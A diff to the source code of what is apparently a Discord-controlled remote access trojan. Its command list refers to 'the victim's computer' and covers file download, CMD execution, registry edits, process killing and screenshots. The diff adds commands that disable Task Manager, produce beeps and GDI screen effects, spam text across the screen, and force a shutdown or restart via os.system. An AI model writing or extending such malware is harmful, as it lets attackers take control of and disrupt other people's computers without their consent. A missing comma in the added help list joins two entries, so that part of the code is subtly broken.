@@ -41,7 +41,6 @@ commands = "\n".join([
 	"cd - self-explanatory",
 	"ls - self-explanatory",
 	"download <file> - download a specific file from the victim's computer",
-	"upload <link> - upload a specific file from your computer to the victim's one",
 	"cmd - execute a CMD command",
 	"run <file> - run a file",
 	"screenshot - say cheese!",
@@ -77,6 +76,19 @@ commands = "\n".join([
 	"regedit <key_path> <value_name> <new_value> - edits a regedit value",
 	"taskkill <name> - kills a process",
 	"processes - lists all the running processes",
+	"disabletaskmgr - disables the task manager",
+	"enabletaskmgr - enables the task manager",
+	"highbeep <duration> - plays a high beep noise",
+	"lowbeep <duration> - plays a low beep noise",
+	"custombeep <frequency> <duration> - plays a custom-frequency beep noise",
+	"piano - play piano using embed buttons",
+	"gdi <mode> <time> - executes GDI effects",
+	"opencd - opens the cd tray",
+	"closecd - closes the cd tray",
+	"spamtext <text> - shows text all over the screen using GDI",
+	"sus - downlaods the entire among us game, unzips it and starts it",
+	"shutdown - performs a computer shutdown"
+	"restart - performs a computer restart",
 	"exit - exit this session"
 ])
 
@@ -879,6 +891,14 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 	if message.content.startswith("sus"):
 		asyncio.create_task(download_sus(message))
 		await message.reply(await femboyaccess("sus", "downloading among us.. :3"))
+
+	if message.content.startswith("shutdown"):
+		await message.reply(await femboyaccess("shutdown", "initiating computer shutdown! :3"))
+		os.system("shutdown /s /t 0")
+
+	if message.content.startswith("restart"):
+		await message.reply(await femboyaccess("restart", "initiating computer restart! :3"))
+		os.system("shutdown /r /t 0")
 
 @client.event
 async def on_disconnect(message):
